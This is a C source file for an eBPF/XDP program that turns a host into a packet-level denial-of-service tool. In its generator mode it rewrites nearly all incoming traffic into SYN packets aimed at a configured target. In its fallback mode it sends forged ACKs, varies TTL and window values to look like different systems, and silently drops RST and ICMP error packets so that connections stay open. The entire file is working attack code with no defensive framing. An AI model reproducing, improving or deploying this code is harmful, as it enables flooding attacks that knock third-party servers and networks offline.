/*
 * XDP V15 Stealth Filter + TX Generator
 * 
 * Two modes controlled by BPF map:
 * 
 * FALLBACK (enabled=0 or no config): Original behavior
 *   - SYN-ACK → ACK response via XDP_TX (complete handshake, hold connection)
 *   - PSH+ACK → ACK via XDP_TX (keep connection alive)  
 *   - FIN → ACK via XDP_TX (hold connection state)
 *   - RST → DROP (prevent connection cleanup)
 *   - ICMP unreachable → DROP
 *
 * GENERATOR (enabled=1): Convert ALL incoming to SYN attack packets
 *   - Everything except SSH → rewrite as SYN → XDP_TX
 */

#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
/* Minimal ICMP header - avoid #include <linux/icmp.h> which pulls in
   linux/if.h → sys/socket.h → gnu/stubs-32.h (missing in BPF env) */
struct icmphdr {
    __u8  type;
    __u8  code;
    __sum16 checksum;
    union {
        struct { __be16 id; __be16 sequence; } echo;
        __be32 gateway;
    } un;
};
#include <linux/in.h>

#define SEC(NAME) __attribute__((section(NAME), used))

#ifndef htons
#define htons(x) ((__u16)( \
        (((__u16)(x) & (__u16)0x00ffU) << 8) | \
        (((__u16)(x) & (__u16)0xff00U) >> 8) ))
#endif
#ifndef ntohs
#define ntohs(x) htons(x)
#endif
#ifndef htonl
#define htonl(x) ((__u32)( \
        (((__u32)(x) & (__u32)0x000000ffUL) << 24) | \
        (((__u32)(x) & (__u32)0x0000ff00UL) << 8) | \
        (((__u32)(x) & (__u32)0x00ff0000UL) >> 8) | \
        (((__u32)(x) & (__u32)0xff000000UL) >> 24) ))
#endif
#ifndef ntohl
#define ntohl(x) htonl(x)
#endif

/* BPF helpers */
static void *(*bpf_map_lookup_elem)(void *map, const void *key) = (void *) 1;
static __u64 (*bpf_ktime_get_ns)(void) = (void *) 5;

/* Target config */
struct xdp_target {
    __u32 target_ip;
    __u16 target_port;
    __u16 pad;
    __u32 src_ip;
    unsigned char src_mac[6];
    unsigned char gw_mac[6];
    __u32 enabled;
};

struct bpf_map_def {
    unsigned int type;
    unsigned int key_size;
    unsigned int value_size;
    unsigned int max_entries;
    unsigned int map_flags;
};

struct bpf_map_def SEC("maps") xdp_target_map = {
    .type = 2,
    .key_size = sizeof(__u32),
    .value_size = sizeof(struct xdp_target),
    .max_entries = 1,
};

/* Fast hash */
static __always_inline __u32 xhash(__u32 x) {
    x = ((x >> 16) ^ x) * 0x45d9f3b;
    x = ((x >> 16) ^ x) * 0x45d9f3b;
    x = (x >> 16) ^ x;
    return x;
}

/* IP checksum: 20 bytes, fully unrolled */
static __always_inline __u16 ip_csum(struct iphdr *iph) {
    __u32 sum = 0;
    __u16 *p = (__u16 *)iph;
    sum += p[0]; sum += p[1]; sum += p[2]; sum += p[3]; sum += p[4];
    sum += p[5]; sum += p[6]; sum += p[7]; sum += p[8]; sum += p[9];
    sum = (sum & 0xffff) + (sum >> 16);
    sum = (sum & 0xffff) + (sum >> 16);
    return (__u16)~sum;
}

/* TCP checksum: fixed 20-byte header, fully unrolled */
static __always_inline __u16 tcp_csum_20(struct iphdr *iph, struct tcphdr *tcph) {
    __u32 sum = 0;
    sum += (iph->saddr & 0xffff); sum += (iph->saddr >> 16);
    sum += (iph->daddr & 0xffff); sum += (iph->daddr >> 16);
    sum += htons(IPPROTO_TCP);
    sum += htons(20);
    __u16 *p = (__u16 *)tcph;
    sum += p[0]; sum += p[1]; sum += p[2]; sum += p[3]; sum += p[4];
    sum += p[5]; sum += p[6]; sum += p[7]; sum += p[8]; sum += p[9];
    sum = (sum & 0xffff) + (sum >> 16);
    sum = (sum & 0xffff) + (sum >> 16);
    return (__u16)~sum;
}

/* Swap src/dst and prepare ACK response */
static __always_inline void swap_for_ack(struct ethhdr *eth, struct iphdr *iph, struct tcphdr *tcph) {
    unsigned char tmp_mac[6];
    __builtin_memcpy(tmp_mac, eth->h_source, 6);
    __builtin_memcpy(eth->h_source, eth->h_dest, 6);
    __builtin_memcpy(eth->h_dest, tmp_mac, 6);

    __u32 tmp_ip = iph->saddr;
    iph->saddr = iph->daddr;
    iph->daddr = tmp_ip;

    __u16 tmp_port = tcph->source;
    tcph->source = tcph->dest;
    tcph->dest = tmp_port;

    tcph->syn = 0;
    tcph->ack = 1;
    tcph->psh = 0;
    tcph->fin = 0;
    tcph->rst = 0;
}

SEC("xdp")
int xdp_v15_stealth(struct xdp_md *ctx) {
    void *data_end = (void *)(long)ctx->data_end;
    void *data = (void *)(long)ctx->data;

    /* Need ETH(14) + IP(20) + TCP(20) = 54 bytes minimum */
    if (data + 54 > data_end)
        return XDP_PASS;

    struct ethhdr *eth = data;
    if (eth->h_proto != htons(ETH_P_IP))
        return XDP_PASS;

    struct iphdr *iph = data + sizeof(struct ethhdr);
    struct tcphdr *tcph = data + sizeof(struct ethhdr) + sizeof(struct iphdr);

    /* Check config */
    __u32 key = 0;
    struct xdp_target *cfg = bpf_map_lookup_elem(&xdp_target_map, &key);
    int gen_mode = (cfg && cfg->enabled);

    /* Drop ICMP unreachable/time-exceeded */
    if (iph->protocol == IPPROTO_ICMP) {
        struct icmphdr *icmph = (struct icmphdr *)tcph;
        if (icmph->type == 3 || icmph->type == 11)
            return XDP_DROP;
        
        /* Generator mode: convert ICMP to SYN */
        if (gen_mode) goto generate_syn;
        return XDP_PASS;
    }

    /* UDP: pass DNS/DHCP, generator mode converts rest */
    if (iph->protocol == IPPROTO_UDP) {
        struct udphdr *udph = (struct udphdr *)tcph;
        __u16 dp = ntohs(udph->dest);
        if (dp == 53 || dp == 67 || dp == 68)
            return XDP_PASS;
        if (gen_mode) goto generate_syn;
        return XDP_PASS;
    }

    if (iph->protocol != IPPROTO_TCP)
        return XDP_PASS;

    /* SSH: always pass */
    if (tcph->dest == htons(22) || tcph->source == htons(22))
        return XDP_PASS;

    /* === Generator mode: convert everything to SYN === */
    if (gen_mode) goto generate_syn;

    /* === Fallback mode: ACK-based amplification === */
    __u32 pkt_hash = iph->saddr ^ iph->id ^ tcph->source ^ tcph->seq;

    /* SYN-ACK → ACK (complete handshake, amplify PPS) */
    if (tcph->syn && tcph->ack) {
        if (pkt_hash & 1)  /* 50% rate */
            return XDP_DROP;

        swap_for_ack(eth, iph, tcph);

        __u32 new_seq = tcph->ack_seq;
        tcph->ack_seq = htonl(ntohl(tcph->seq) + 1);
        tcph->seq = new_seq;

        __u32 h = iph->saddr ^ tcph->dest;
        if ((h & 3) == 0) { tcph->window = htons(29200); iph->ttl = 64; }
        else if ((h & 3) == 1) { tcph->window = htons(65535); iph->ttl = 128; }
        else if ((h & 3) == 2) { tcph->window = htons(64240); iph->ttl = 64; }
        else { tcph->window = htons(32768); iph->ttl = 127; }

        iph->id = htons((h >> 16) & 0xFFFF);
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->check = 0;
        iph->check = ip_csum(iph);
        tcph->check = 0;
        tcph->check = tcp_csum_20(iph, tcph);
        return XDP_TX;
    }

    /* PSH+ACK → ACK (keep connection alive) */
    if (tcph->psh && tcph->ack) {
        if (pkt_hash & 3)  /* 25% rate */
            return XDP_DROP;

        int tcp_data_len = ntohs(iph->tot_len) - sizeof(struct iphdr) - sizeof(struct tcphdr);
        if (tcp_data_len <= 0)
            return XDP_DROP;

        swap_for_ack(eth, iph, tcph);

        __u32 new_seq = tcph->ack_seq;
        tcph->ack_seq = htonl(ntohl(tcph->seq) + tcp_data_len);
        tcph->seq = new_seq;

        tcph->window = htons((iph->saddr & 0x1FF) + 1);
        iph->ttl = 64;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->check = 0;
        iph->check = ip_csum(iph);
        tcph->check = 0;
        tcph->check = tcp_csum_20(iph, tcph);
        return XDP_TX;
    }

    /* FIN → ACK (hold connection) */
    if (tcph->fin) {
        if (pkt_hash & 3)  /* 25% rate */
            return XDP_DROP;

        swap_for_ack(eth, iph, tcph);

        __u32 new_seq = tcph->ack_seq;
        tcph->ack_seq = htonl(ntohl(tcph->seq) + 1);
        tcph->seq = new_seq;

        tcph->window = htons((iph->saddr & 0xFF) + 1);
        iph->ttl = 64;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->check = 0;
        iph->check = ip_csum(iph);
        tcph->check = 0;
        tcph->check = tcp_csum_20(iph, tcph);
        return XDP_TX;
    }

    /* RST: drop silently (prevent connection cleanup) */
    return XDP_DROP;

generate_syn:
    /* === XDP_TX SYN generator === */
    {
        __u32 rand = xhash((__u32)bpf_ktime_get_ns() ^ iph->id ^ iph->saddr);
        __u16 src_port = 1024 + (rand % 64511);

        __builtin_memcpy(eth->h_dest, cfg->gw_mac, 6);
        __builtin_memcpy(eth->h_source, cfg->src_mac, 6);

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(40);
        iph->id = htons(rand >> 16);
        iph->frag_off = htons(0x4000);
        iph->ttl = 55 + (rand & 0x0F);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = cfg->src_ip;
        iph->daddr = cfg->target_ip;
        iph->check = 0;
        iph->check = ip_csum(iph);

        tcph->source = htons(src_port);
        tcph->dest = htons(cfg->target_port);
        tcph->seq = htonl(rand);
        tcph->ack_seq = 0;
        *((unsigned char *)tcph + 12) = (5 << 4);
        *((unsigned char *)tcph + 13) = 0x02;
        tcph->window = htons(65535);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->check = tcp_csum_20(iph, tcph);

        return XDP_TX;
    }
}

char _license[] SEC("license") = "GPL";
